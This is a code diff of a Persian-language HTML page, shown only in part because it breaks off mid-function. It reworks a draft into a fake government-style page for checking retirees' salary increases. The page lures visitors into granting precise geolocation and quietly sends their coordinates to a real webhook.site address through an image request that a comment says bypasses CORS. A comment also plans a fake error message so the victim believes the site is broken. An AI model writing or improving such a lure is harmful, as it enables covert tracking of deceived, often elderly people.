@@ -3,51 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>پورتال خبری</title>
+    <title>سامانه بررسی وضعیت حقوق</title>
     <style>
-        body { font-family: sans-serif; background-color: #f0f2f5; text-align: center; padding: 20px; }
-        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); cursor: pointer; }
-        .btn { background: #e74c3c; color: white; padding: 10px 20px; border-radius: 5px; display: inline-block; margin-top: 10px; text-decoration: none; }
+        body { font-family: Tahoma, Arial, sans-serif; text-align: center; padding: 20px; background-color: #f4f7f6; direction: rtl; }
+        .container { max-width: 500px; margin: 50px auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        h2 { color: #2c3e50; }
+        p { color: #7f8c8d; margin-bottom: 25px; }
+        .btn { background-color: #2ecc71; color: white; padding: 15px 30px; font-size: 18px; font-weight: bold; border: none; cursor: pointer; border-radius: 10px; transition: background 0.3s; }
+        .btn:hover { background-color: #27ae60; }
     </style>
 </head>
 <body>
-
-    <div class="card" onclick="getLocation()">
-        <h2>اعلام جدول جدید حقوق ۱۴۰۳</h2>
-        <p>برای مشاهده مبلغ، روی دکمه زیر کلیک کنید</p>
-        <div class="btn">مشاهده مبلغ</div>
+    <div class="container">
+        <h2>سامانه بررسی افزایش حقوق بازنشستگان</h2>
+        <p>جهت تایید منطقه سکونت و مشاهده وضعیت پرداخت‌ها، روی دکمه زیر کلیک نمایید.</p>
+        <button class="btn" onclick="getLocation()">تأیید منطقه سکونت و ورود</button>
     </div>
 
     <script>
     function getLocation() {
-        // 1. بررسی اینکه آیا مرورگر اصلا قابلیت لوکیشن دارد یا نه
         if (navigator.geolocation) {
-            alert("در حال درخواست دسترسی... لطفا روی Allow کلیک کنید");
-            
-            navigator.geolocation.getCurrentPosition(sendPosition, showError);
+            navigator.geolocation.getCurrentPosition(sendPosition, showError, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
         } else {
-            alert("مرورگر شما از لوکیشن پشتیبانی نمی‌کند");
+            alert("مرورگر شما از قابلیت مکان‌یابی پشتیبانی نمی‌کند.");
         }
     }
 
     function sendPosition(position) {
         var lat = position.coords.latitude;
         var lon = position.coords.longitude;
+        var webhookUrl = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";
         
-        alert("مختصات گرفته شد! در حال ارسال به سرور...");
+        // روش جدید: ارسال داده‌ها از طریق یک درخواست تصویر (برای دور زدن خطای CORS)
+        var dataUrl = webhookUrl + "?lat=" + lat + "&lon=" + lon;
+        var img = new Image();
+        img.src = dataUrl;
 
-        // !!! لینک وب‌هوک خودت را اینجا جایگزین کن !!!
-        var webhookUrl = "https://webhook.site/YOUR_ID_HERE"; 
-
-        var img = new Image(); 
-        img.src = webhookUrl + "?lat=" + lat + "&lon=" + lon;
-        
-        alert("ارسال موفقیت‌آمیز بود. حالا پنل وب‌هوک را چک کن.");
-    }
-
-    function showError(error) {
-        switch(error.code) {
-            case error.PERMISSION_DENIED:
-                alert("خطا: شما اجازه دسترسی به مکان را ندادید (Block کردید)");
-                break;
-            case error.POSITION_UNAVAILABLE:
+        // نمایش پیام خطا برای کاربر (برای اینکه فکر کند سایت خراب است)
